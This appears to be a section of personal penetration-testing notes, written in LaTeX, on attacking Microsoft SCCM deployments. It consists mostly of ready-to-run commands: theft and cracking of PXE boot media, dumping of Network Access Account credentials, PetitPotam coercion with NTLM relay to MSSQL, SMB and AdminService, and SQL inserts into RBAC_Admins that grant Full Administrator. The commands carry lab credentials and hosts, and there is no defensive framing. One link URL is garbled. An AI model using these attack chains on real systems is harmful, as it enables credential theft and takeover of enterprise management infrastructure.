\section{Attacks}

\subsection{PXE exploit}

\subsubsection{Non password protected}
with \verb+pxethiefy+:
\begin{verbatim}
sudo python3 pxethiefy.py explore -i <interface>
sudo python3 pxethiefy.py explore -i <interface> -a <pxe_ip>
\end{verbatim}

with \verb+PXEThief+:
\begin{verbatim}
pxethief.py 1
# or
pxethief.py 2 <target_fqdn>
\end{verbatim}


\subsubsection{Password protected}
If PXE is protected by a password the files will be encrypted, \href{https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module}{this hashcat module} can be used to decrypt the downloaded media file.

with \verb+PXEThief+:
\begin{verbatim}
pxethief.py 1 or pxethief.py 2 <target_fqdn>

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"
"2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"
"2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"

pxethief.py 5 2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var

./hashcat -m 19850 ./hash ./list.txt --force

python3 pxethief.py 3 "2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var" Password123
\end{verbatim}



with \verb+pxethiefy+:
\begin{verbatim}
/hashcat -m 19850 ./hash ./list.txt --force
sudo python3 pxethiefy.py decrypt -p <passwor> -f <boot_var_file>
\end{verbatim}


\subsection{Network Access account}


\subsubsection{DPAPI}
It is possible to retrieve the Network Access Accounts (NAA) in the NAA policy which it's sent by the SCCM server and stored on the SCCM client disk encrypted with DPAPI. With SYSTEM access on the client, the credentials can be retrieved:

prerequisites:
\begin{itemize}
    \item local admin on a SCCM client
\end{itemize}

tools:
\begin{itemize}
    \item sharpSCCM
        \begin{verbatim}
        .\sharpscc.exe get secrets
        # NAA, Task Sequences, Collection Variables
        .\sharpsccm.exe local secrets -m wmi
        \end{verbatim}
        
    \item sharpDPAPI
        \begin{verbatim}
        .\sharpDPAPI.exe SCCM
        \end{verbatim}
    \item Impacket SystemDPAPIdump.py (fork \url{https://github.com/clavoillotte/impacket}):
        \begin{verbatim}
        python3 SystemDPAPIdump.py -creds -sccm la_jubeaz:'jubeaz'@architect -target-ip 172.16.0.20
        -userkey USERKEY      \
            dpapi_userkey for SYSTEM (e.g. if previously dumped using secretsdump). \
            If not provided an LSA secrets dump will be performed to retrieve it.
        \end{verbatim}
    \item sccmhunter:
        \begin{verbatim}
        python3 sccmhunter.py dpapi -debug -u la_jubez -p jubeaz -target 172.16.0.20
        \end{verbatim}
        
\end{itemize}


\subsubsection{Computer request}

A computer account has the ability to register itself with the SCCM server and request the encrypted NAA policies, decrypt them, de-obfuscate them and retrieve the NAA's credentials in them. A controlled computer account is needed to send the authenticated request, but the account to spoof doesn't need to be the same. \href{https://blog.xpnsec.com/unobfuscating-network-access-accounts/}{Full explains here}. 

this will create a computer un SCCM devices

using \href{https://github.com/xpn/sccmwtf}{SCCMwtf}
\begin{verbatim}
python sccmwtf.py \
    DESKTOP-2NHHIAVP \
    DESKTOP-2NHHIAVP.haas.local \
    'bran.haas.local' \
    'haas.local\DESKTOP-2NHHIAVP$' \
    'flg9lmKdwiJ8'
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
grep CDATA naapolicy.xml
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

need to set dependencies on last version
\begin{verbatim}
#Create a computer account and request the policies
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto

#To use an already controlled computer account
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

\subsubsection{Relay attack}

code not yet merged to \verb+ntlmrelayx.py+ see \href{https://github.com/Tw1sm/impacket/tree/feature/sccm-relay}{sccm-relay}

with poisonning (responder):
\begin{verbatim}
nano Responder.conf (turn off smb and http)
responder -I eth0
\end{verbatim}

or coercion (petitpotam):
\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p Jubeaz12345+- -d haas.local 192.168.2.3 architect.haas.local
\end{verbatim}


\begin{verbatim}
sudo ntlmrelayx.py -t http://bran.haas.local/ccm_system_windowsauth/request \
    --sccm \
    --sccm-device test1 \
    --sccm-fqdn bran.haas.local \
    --sccm-server bran \
    --sccm-sleep 10 \
    -smb2support
\end{verbatim}

To correct:
verb+PermissionError: [Errno 13] Permission denied: '/tmp/key.pem'+


Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}


\subsection{Client Push Account}

done from windows.

\subsubsection{Automatic installation}
prerequisites:
\begin{itemize}
    \item Automatic Site-Wide Client Push Installation
    \item Allow Connection Fallback to NTLM
\end{itemize}

\begin{itemize}
    \item Option 1: Uninstall the client
    \item Option 2: Downgrade the client version
    \item Option 3: Break the domain trust (delete the all the \verb+HOST/aaa+ spn of the computer account) to force the SCCM Client Push account authentication to fallback to NTLM instead of Kerberos:
\end{itemize}

disable the firewall, delete all admin accounts and start \verb+inveigh+

\subsubsection{triggering on Demand}


\subsection{SCCM Administrator Privilege Escalation}

The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy. This means it is possible to coerce the primary site server authentication and relay it to the database server and obtain an administrative access.
\begin{itemize}
    \item \url{https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf}
    \item \url{https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1}
    \item \url{https://www.thehacker.recipes/ad/movement/sccm-mecm#sccm-site-takeover}
\end{itemize}

\subsubsection{Relay to the site database server}

Setup a NTLM relay server to MSSQL or SMB:
\begin{verbatim}
# targetting MS-SQL
sudo ntlmrelayx.py -t "mssql://172.16.0.11" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "smb://siteDatabase.domain.local" -smb2support -socks
\end{verbatim}

Coerce the primary site server authentication via PetitPotam, PrinterBug ou whatever.

\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p 'Jubeaz12345+-' -d haas.local 192.168.2.3 bran.haas.local
\end{verbatim}


\begin{verbatim}
proxychains mssqlclient.py HAAS/'BRAN$'@fenris.haas.local -windows-auth -no-pass
\end{verbatim}

{\bf check computer account on DB and create a new admin account for persistance}


{\bf Retrieve the controlled user SID}:
\begin{verbatim}
rpcclient dc03.haas.local -U 'haas.local\lowpriv%Jubeaz12345+-' -c "lookupnames lowpriv"

# And convert it in HEX format
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('-1x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
\end{verbatim}

{\bf Establish MECM privesc to full admin}:
\begin{verbatim}
-- Identify sccm db
SELECT name FROM master.dbo.sysdatabases
-- Switch to site database
use <site_db> # SCCM_HS1

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO  RBAC_Admins 
    (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) 
    VALUES 
    (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<sccm_site_code>');

-- Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

-- Add RBAC_ExtendedPermissions granting the AdminID the Full Administrator (SMS0001R) RoleID for
-- for the “All Objects” scope (SMS00ALL), 
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');

-- the “All Systems” scope (SMS00001), 
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00001','1');

-- the “All Users and User Groups” scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) 
    VALUES (<AdminID>,'SMS0001R','SMS00004','1');
\end{verbatim}


\verb+sccmhunter+ cat print all mssql command (including sid resolution)
\begin{verbatim}
python3 sccmhunter.py mssql -stacked -d haas.local -dc-ip 172.16.0.1 -tu lowpriv -sc HS1 -u lowpriv -p Jubeaz12345+-
\end{verbatim}

Success can be verified with \verb+SharpSCCM+ on a client computer.
\begin{verbatim}
SharpSCCM.exe get class-instances SMS_Admin
\end{verbatim}



\subsubsection{Relay to the AdminService API}
If the HTTP API is accessible on the SMS Provider server, setup \href{https://github.com/fortra/impacket/pull/1593}{ntlmrelayx with this PR} to add user1 as a new SCCM admin:
\begin{verbatim}
ntlmrelayx.py -t https://<sccm_fqdn>/AdminService/wmi/SMS_Admin -smb2support \
    --adminservice \
    --logonname "<domain_netbios>\<user>" \
    --displayname "<domain_netbios>\<user>" \
    --objectsid <user_sid>
\end{verbatim}


\subsubsection{Relay from a passive to the active site server}
When high availability in required, it is possible to find a passive site server that will be used only if the active site server stop working. Its machine account must be a member of the local Administrators group on the active site server.

Setup a NTLM relay pointing to the active server and coerce an authentication from the passive server.
\begin{verbatim}
ntlmrelayx.py -t activeServer.domain.local -smb2support -socks
\end{verbatim}

Then, through the proxy socks session, dump the SAM and LSA with secretsdump.The active site server must be a member of the SMS Provider administrators (it is member of the \verb+SMS Admins+ group), its credentials can be used to add a new controlled user to the \verb+Full Admin+ SCCM group.

\begin{verbatim}
python3 sccmhunter.py admin -u activeServer$ -p :<nthash> -ip <SMS_Provider>

() (C:\) >> add_admin controlledUser <controlledUser_SID>
() (C:\) >> show_admins
\end{verbatim}


\subsection{WSUS}

\href{https://www.²:ethehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing}{Spoof the WSUS server and hijack the update} if the updates are pushed through HTTP and not HTTPS
